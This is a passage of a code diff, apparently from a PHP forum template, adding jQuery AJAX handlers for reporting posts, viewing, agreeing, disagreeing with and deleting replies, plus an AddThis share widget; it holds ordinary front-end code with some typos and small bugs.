+			$('#post_contents').html('<p align="center"><img src="../images/ajax-loader.gif"  /></p>');
+	        dataString='postid='+id;
+			$.ajax({
+			type: "POST",
+			url: "<?php echo $GLOBALS['base_url']; ?>ajax/post-ajax.php?mode=reportAbuse",
+			cache: false,
+			data: dataString,
+			dataType: "json",
+			success: function(data) {
+			if(data.success == "yes")
+			  {    
+				refreshPost();
+				}
+				else if(data.success == "no")
+			    {    
+				    
+					alert("failed to load");
+					
+				}
+			
+				else {
+					alert(" Occured internal Error.please check network connection" );
+				}
+			}
+		});
+	}	
+	
+  function viewreplies(id){	
+  	 		dataString='postid='+id;
+			$.ajax({
+			type: "POST",
+			url: "<?php echo $GLOBALS['base_url']; ?>ajax/post-ajax.php?mode=viewReplies",
+			cache: false,
+			data: dataString,
+			dataType: "json",
+			success: function(data) {
+			if(data.success == "yes")
+			  {      
+			        $('.view_all'+id).html('');
+			  		 $('.viewList'+id).html('');
+			   		$('.viewList'+id).html(data.html);
+				
+				}
+				else if(data.success == "no")
+			    {    
+				    
+					alert("failed to load");
+					
+				}
+			
+				else {
+					alert(" Occured internal Error.please check network connection" );
+				}
+			}
+		});
+ } 
+ 
+ function agreeReply(id){
+	        dataString='replyid='+id+'&lik=1';
+			$.ajax({
+			type: "POST",
+			url: "<?php echo $GLOBALS['base_url']; ?>ajax/post-ajax.php?mode=agreeReply",
+			cache: false,
+			data: dataString,
+			dataType: "json",
+			success: function(data) {
+			if(data.success == "yes")
+			  {    
+				
+				
+				$('.agreeReply'+id).html("");
+				$('.agreeReply'+id).html("<a>Agreed</a>");
+				$('.disagreeReply'+id).html("");
+				$('.disagreeReply'+id).html('<a onclick="disagreeReply('+id+');" href="javascript:void(0);">Disgree </a>');
+				$('#agreereply_circle'+id).html('');
+				$('#agreereply_circle'+id).html(data.agree);
+				$('#disagreereply_circle'+id).html('');
+				$('#disagreereply_circle'+id).html(data.disagree);
+				
+				//alert(""+data.agree);
+				}
+				else if(data.success == "no")
+			    {    
+				    if(data.status=='liked'){
+						alert("already agreed");
+					}
+					else{
+					alert("failed to load");
+					}
+				}
+			
+				else {
+					alert(" Occured internal Error.please check network connection" );
+				}
+			}
+		});
+	}
+	 function disagreeReply(id){
+	        dataString='replyid='+id+'&lik=0';
+			$.ajax({
+			type: "POST",
+			url: "<?php echo $GLOBALS['base_url']; ?>ajax/post-ajax.php?mode=agreeReply",
+			cache: false,
+			data: dataString,
+			dataType: "json",
+			success: function(data) {
+			if(data.success == "yes")
+			  {    
+				
+				$('.disagreeReply'+id).html("");
+				$('.disagreeReply'+id).html("<a>Disgreed</a>");
+				$('.agreeReply'+id).html("");
+				$('.agreeReply'+id).html('<a onclick="agreeReply('+id+');" href="javascript:void(0);">Agree</a>');
+				$('#agreereply_circle'+id).html('');
+				$('#agreereply_circle'+id).html(data.agree);
+				$('#disagreereply_circle'+id).html('');
+				$('#disagreereply_circle'+id).html(data.disagree);
+				
+				//alert(""+data.agree);
+				}
+				else if(data.success == "no")
+			    {    
+				    if(data.status=='liked'){
+						alert("already disagreed");
+					}
+					else{
+					alert("failed to load");
+					}
+				}
+			
+				else {
+					alert(" Occured internal Error.please check network connection" );
+				}
+			}
+		});
+	}	
+	
+	function deleteReply(id,pid){
+	         dataString='replyid='+id+'&pid='+pid;
+			$.ajax({
+			type: "POST",
+			url: "<?php echo $GLOBALS['base_url']; ?>ajax/post-ajax.php?mode=deleteReply",
+			cache: false,
+			data: dataString,
+			dataType: "json",
+			success: function(data) {
+			if(data.success == "yes")
+			  {    
+				$('.view_all'+pid).html('');
+				$('.view_all'+pid).html(data.view);
+				$('.viewList'+pid).html('');
+				$('#commentreplyArea'+pid).val('');
+				$('.viewList'+pid).html(data.html);
+				}
+				else if(data.success == "no")
+			    {    
+				    if(data.status=='liked'){
+						alert("already disagreed");
+					}
+					else{
+					alert("failed to load");
+					}
+				}
+			
+				else {
+					alert(" Occured internal Error.please check network connection" );
+				}
+			}
+		});
+	}
+	
+/*function saveTilte(id){
+alert(id);
+$( 'title' ).html ( 'new title' +id); 
+}*/	
+					
+</script>
+
+<!-- AddThis Button BEGIN -->
+
+<script type="text/javascript">var addthis_config = {"data_track_addressbar":true; }</script>
+<script type="text/javascript" src="http://s7.addthis.com/js/300/addthis_widget.js#pubid=ra-50657e722d6e2021"></script>
+<!-- AddThis Button END -->
+
+
